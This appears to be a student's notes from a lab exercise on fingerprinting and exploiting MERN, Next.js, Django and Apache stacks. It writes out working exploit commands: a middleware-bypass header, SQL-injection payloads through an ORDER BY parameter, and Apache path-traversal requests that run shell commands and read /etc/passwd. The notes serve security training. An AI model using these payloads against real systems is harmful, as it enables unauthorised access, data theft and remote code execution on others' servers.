
# Modern Web Stacks

# MERN Stack
- MERN application are everywhere
- The stack (MongoDB, Express.js, React, Node.js) powers a large share of modern SaaS products, internal tools, and API backends

## Fingerprinting the MERN Stack
- Before touching any exploit payloads, identify what you are dealing with.
- So, start with header check
    ```
    curl -I machine_ip:3000/
    ```
    - **X-Powered-By: Express** is the primary signal
    - Sometime this is absent if developer explicitly called **app.disable('x-powered-by')**
    - Reverse proxies and PaaS platforms (Vercel, Cloudflare, Railway) oftern strip this header before it reaches client
    - If this is absent, fall back to cookie name and unhandled-route format as secondary signals 
    - The **connect.sid** cookie comes from express-session with saveUninitialized: true
    - with **saveuninitialize: false** , cookie appears after session is created
    - Absebce of **connect.sid** doesn't confirm the absence of Express
- To confirm the Express unhandled-route fingerprint, request nonexistent path 
    ```
    curl http://machine_ip:3000/nonexistent
    ```

## Exploiting MERN
- The next step after fingerprinting is API surface enumeration
- MERN apps commonly expose JSON APIs for profile updates, preferences, and user settings
- The app on port 3000 exposes two endpoints
    1. /api/user/update - Method(POST) - Acceots JSON and merges it into session user object
    2. /api/admin/flag - Method(GET) - Returns a flag if the requesting user has admin access 
- Start by confirming the admin route is gated
    ```
    curl -c cookies.txt http://MACHINE_IP:3000/
    ```
    ```
    curl -b cookies.txt http://MACHINE_IP:3000/api/admin/flag
    ```
- Looking update endpoint accepts under normal conditions
    ```
    curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update -H "Content-Type: application/json" -d '{"name": "Alice", "email":"alice@example.com"}'
    ```
    - Every JavaScript object inherits from a shared root called **Object.prototype**
    - When merge function receives **{"proto": {"isAdmin": true}}** without filtering the proto key, it writes **isAdmin: true** directly onto **Object.prototype**, not onto any individual user object





# React / Next.js
- Express is foundation of MERN stack
- Next.js builds on top of it, adding abstractions like App Router, React Server Components, and middleware that create a different and more severe attack surface
- App Router runs React components directly on the server. Instead of shipping JavaScript to the browser, the server executes the component and streams the result to the client using a binary like format called the RSC flight protocol

## Fingerprinting Next.js
- Start with passive fingerprinting
    ```
    curl -I http://machine_ip:3001/
    ```

    - **window.__next_f** in script tag confirms **App Router**
    
## CVE-2025-29927: Middleware Bypass
- In Next.js, middleware is a function that runs before every request reaches a page
- Developer use it as central gatekeeper, aytgebtucatuib checks, session validation, and redirect logic all live here
- The /dashboard route in this app is a typical example
    - Browse /products/ to see what we are dealing with
    ```
    curl -v http://machine_ip:3001/dashboard
    ```
- Middleware is working, if no cookie, no dashboard, the server sends us straight to /login

- For vulnerability
    ```
    curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://10.48.160.145:3001/dashboard
    ```


# Django
- **CVE-2021-35042** is SQL injection vulnerability in Django's **order_by()** query method, rated CVSS **9.8 Critical** and requiring no authentication to exploit

## Stack Identity
- The Django admin panel at **/admin/** and CSRF middleware are enabled by default in virtually every Django project
- On Ubuntu, it runs typically on **port 8000**
- Admin panel alone is a reliable stack signal before you send a single exploit payload
 
## Fingerprinting Django
- Start with header check against running app
    ```
    curl -I "http://machine_ip:8000/products/"
    ```
    - **csrfmiddlewaretoken** hidden field is the most reliable Django fingerprint

- The App: Products Catalogue
    - App running on port 8000 is simple product catalogue
    - Browse to /products/ to see what we are dealing
        ```
        curl -s "http://machine_ip:8000/products/"
        ```

        - Here, Having **csrfmiddlewaretoken** confirm Django
        - **order** parameter in form, is our injection point

## CVE-2021-35042: The Vulnerability
```
order = self.request.GET.get('order', 'name')
sql = (
    'SELECT id, name, price, description FROM products_product '
    f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
)
```
- The CASE WHEN structure is always true(1=1), so the THEN branch always executes, making it the injection entry point

- The **updatexml()** technique exploits how MySQL handles XPath errors
- **updatexml(1, xpath_expr, 1)** raises an error if XPath expression is invalid
- The **updatexml()** technique only works when **DEBUG=True** is set in **settings.py**
- For **DEBUG=False** returns generic 500 page with no errors details
- If debug output is suppressed, blind time-based injection using **SLEEP()** is the fallback

## Exploitation Walkthrough
1. Extract MySQL Version
    ```
    curl -s "http://10.48.142.230:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'
    ```
2. Extract the Database Name
    ```
    curl -s "http://10.48.142.230:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
    ```


# LAMP
- LAMP(Linux, Apache, MySQL,PHP) is one of the earliest and most widely adopted web application stacks
- It became popular because all its components are open-source, stable, and easy to deploy
- Linux provides OS, Apache handles web requests, MySQL manages the database, and PHP processes dynamic content

## Stack Identity
- On Ubuntu, Apache runs under **www-data**, serves files from **/var/www/html**, and passes dynamic requests to PHP through **mod_php** or **PHP-FPM**
- This classic LAMP combination creates common attack surfaces like exposed
    - PHP files
    - database errors
    - weak file permissions
    - misconfigured Apache/PHP settings

## Fingerprinting the LAMP Stack
- Start with header check
    ```
    curl -I http://machine_ip:8080/
    ```
    - Apache also repeats version in 404 error page footers. Request nonexistent path to confirm
        ```
        curl -v http://10.48.142.230:8080/nonexistent 2>&1
        ```
    - The final signal is **/cgi-bin/**
    - 403 forbidden means directory exists, and listing is disabled
    - 404 mean it is not present at all
    - For this exploit, **mod_cgi** is required
        ```
        curl -v http://machine_ip:8080/cgi-bin/ 2>&1
        ```

## CVE-2021-41773: The Vulnerability
- Apache 2.4.49 introduced a change to **ap_normalize_path()** function
- This broke the path traversal filter
- The bug is in decode order
    - When you send **.%2e/**( a literal dor followed by URL encoded dot and a slash), the filter sees **.%2e/** and doesn't recognise it as **../** and bypassed filter

- Why **--path-as-is** is required?
    - curl normalises URLs before sending them
    - Without **--path-as-is**, curl clean up **.%2e/** sequences before the request leaves your machine

## Exploitation
- you confirmed Apache 2.4.49 on port **8080**, with **mod_cgi** enabled on **/cgi-bin/**
- you have a direct path to unauthenticated RCE
1. Confirm Remote Code Execution
    ```
    curl -s --path-as-is "http://10.48.142.230:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; id'
    ```
    - Traverse from **/cgi-bin/** up to **/bin/sh** using four **.%2e/** segments.
    - The **echo Content-Type: text/plain; echo;** preamble is required by CGI spec
    - Apache need valid HTTP header block before the body, or it returns a 500.
    - Bare **echo** outputs the required blank separator line
    - If Apache process is running as **daemon** RCE confirmed

2. Read system accounts
    ```
    curl -s --path-as-is "http://10.48.142.230:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
    ```
    - The first non-root account is **daemon** account, which is the same user running the Apache process. This confirms the server is not running as root
    


# Automation
- When working through a scope with many hosts, Nikto gives quick first pass; it probes each service, reads response headers, and surfaces stack signals and known misconfigurations without you writing a single payload
## Scanning all four stacks
1. Port 3000- MERN Stack
    ```
    nikto -h http://machine_ip:3000
    ```
2. Port 3001- Next.js
    ```
    nikto -h http://machine_ip:3001
    ```
3. Port 8000- Django
    ```
    nikto -h http://machine_ip:8000
    ```
4. Port 8080- Apache
    ```
    nikto -h http://machine_ip:8080
    ```
    - For MERN and Django, the stack is confirmed, but Nikto has no templates for application -level injection flaws. Thats where manual techniques for Next.js and Apache is required


## CVE Summary
1. MERN/Express- **CVE-2020-8203** - Impact(Prototype pollution- auth bypass) - 7.4 High
2. Next.js- **CVE-2025-29927** - Single header Full middleware bypass - 9.1 Critical
3. Django ORM- **CVE-2021-35042 - SQL injection via unparameterised ORDER BY - 9.8 Critical
4. Apache LAMP- **CVE-2021-41773** - Path traversal + mod_cgi RCE - 9.8 Critical